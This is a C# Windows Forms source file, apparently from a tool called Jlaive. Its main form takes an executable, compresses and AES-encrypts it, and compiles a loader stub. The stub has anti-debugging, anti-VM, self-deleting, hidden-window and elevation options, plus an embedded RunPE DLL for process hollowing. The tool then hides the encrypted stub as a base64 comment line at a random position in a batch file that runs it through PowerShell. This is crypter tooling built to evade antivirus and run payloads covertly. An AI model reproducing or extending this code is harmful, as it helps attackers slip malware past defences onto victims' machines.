using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

using static Jlaive.Utils;

namespace Jlaive
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        // Event handlers
        private void Form1_Load(object sender, EventArgs e)
        {
            SettingsObject obj = Settings.Load();
            if (obj != null) UnpackSettings(obj);
            UpdateKeys();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Save(PackSettings());
            Environment.Exit(0);
        }

        private void openButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            textBox1.Text = ofd.FileName;
        }

        private void buildButton_Click(object sender, EventArgs e) => Crypt();
        private void refreshKeys_Click(object sender, EventArgs e) => UpdateKeys();

        private void addFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            listBox1.Items.Add(ofd.FileName);
        }

        private void removeFile_Click(object sender, EventArgs e)
        {
            listBox1.Items.Remove(listBox1.SelectedItem);
        }

        // Functions
        private void Crypt()
        {
            buildButton.Enabled = false;
            tabControl1.SelectedTab = tabControl1.TabPages["outputPage"];
            listBox2.Items.Clear();

            Random rng = new Random();
            string _input = textBox1.Text;
            byte[] _key = Convert.FromBase64String(key.Text);
            byte[] _iv = Convert.FromBase64String(iv.Text);
            StubGen stubgen = new StubGen(_key, _iv, rng);

            if (!File.Exists(_input))
            {
                MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            if (Path.GetExtension(_input) != ".exe")
            {
                MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }

            Console.ForegroundColor = ConsoleColor.Gray;
            byte[] pbytes = File.ReadAllBytes(_input);
            bool isnetasm = IsAssembly(_input);

            if (isnetasm)
            {
                listBox2.Items.Add("Patching assembly...");
                pbytes = Patcher.Fix(pbytes);
            }

            listBox2.Items.Add("Encrypting payload...");
            byte[] payload_enc = Encrypt(Compress(pbytes), _key, _iv);

            listBox2.Items.Add("Creating stub...");
            string stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, meltFile.Checked, !isnetasm);

            listBox2.Items.Add("Building stub...");
            File.WriteAllBytes("payload.exe", payload_enc);
            if (!isnetasm)
            {
                byte[] runpedll_enc = Encrypt(Compress(GetEmbeddedResource("Jlaive.Resources.runpe.dll")), _key, _iv);
                File.WriteAllBytes("runpe.dll", runpedll_enc);
            }
            List<string> embeddedresources = new List<string>();
            embeddedresources.Add("payload.exe");
            if (!isnetasm) embeddedresources.Add("runpe.dll");
            embeddedresources.AddRange(listBox1.Items.Cast<string>());
            Compiler compiler = new Compiler
            {
                References = new string[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" },
                Resources = embeddedresources.ToArray()
            };
            JCompilerResult result = compiler.Build(stub);
            if (result.CompilerResults.Errors.Count > 0)
            {
                File.Delete("payload.exe");
                if (!isnetasm) File.Delete("runpe.dll");
                MessageBox.Show($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, result.CompilerResults.Errors.Cast<string>())}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            File.Delete("payload.exe");
            if (!isnetasm) File.Delete("runpe.dll");

            listBox2.Items.Add("Encrypting stub...");
            byte[] stub_enc = Encrypt(Compress(result.AssemblyBytes), _key, _iv);

            listBox2.Items.Add("Creating PowerShell command...");
            string pscommand = stubgen.CreatePS();

            listBox2.Items.Add("Creating batch file...");
            string content = stubgen.CreateBat(pscommand, hidden.Checked, runas.Checked);
            List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
            content_lines.Insert(rng.Next(0, content_lines.Count), ":: " + Convert.ToBase64String(stub_enc));
            content = string.Join(Environment.NewLine, content_lines);

            SaveFileDialog sfd = new SaveFileDialog()
            {
                AddExtension = true,
                DefaultExt = "bat",
                Title = "Save File",
                Filter = "Batch files (*.bat)|*.bat",
                RestoreDirectory = true,
                FileName = Path.ChangeExtension(_input, "bat")
            };
            sfd.ShowDialog();

            listBox2.Items.Add("Writing output...");
            File.WriteAllText(sfd.FileName, content, Encoding.ASCII);

            MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            refreshKeys.PerformClick();
            buildButton.Enabled = true;
        }

        private void UpdateKeys()
        {
            AesManaged aes = new AesManaged();
            key.Text = Convert.ToBase64String(aes.Key);
            iv.Text = Convert.ToBase64String(aes.IV);
            aes.Dispose();
        }

        private void UnpackSettings(SettingsObject obj)
        {
            textBox1.Text = obj.inputFile;
            antiDebug.Checked = obj.antiDebug;
            antiVM.Checked = obj.antiVM;
            meltFile.Checked = obj.selfDelete;
            hidden.Checked = obj.hidden;
            runas.Checked = obj.runas;
            listBox1.Items.AddRange(obj.bindedFiles);
        }

        private SettingsObject PackSettings()
        {
            SettingsObject obj = new SettingsObject()
            {
                inputFile = textBox1.Text,
                antiDebug = antiDebug.Checked,
                antiVM = antiVM.Checked,
                selfDelete = meltFile.Checked,
                hidden = hidden.Checked,
                runas = runas.Checked
            };
            List<string> paths = new List<string>();
            foreach (string item in listBox1.Items) paths.Add(item);
            obj.bindedFiles = paths.ToArray();
            return obj;
        }
    }
}
